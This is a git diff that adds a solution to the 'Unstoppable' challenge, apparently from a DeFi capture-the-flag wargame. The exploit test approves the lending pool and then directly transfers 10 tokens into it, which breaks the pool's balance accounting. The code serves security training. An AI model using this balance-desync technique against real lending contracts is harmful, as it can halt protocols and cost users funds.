@@ -40,6 +40,14 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const amount = ethers.utils.parseEther('10');
+        let attackerToken = await this.token.connect(attacker);
+        let txn = await attackerToken.approve(this.pool.address, amount);
+        txn.wait(1);
+
+        await attackerToken.transfer(
+            this.pool.address, amount
+        );
     });
 
     after(async function () {
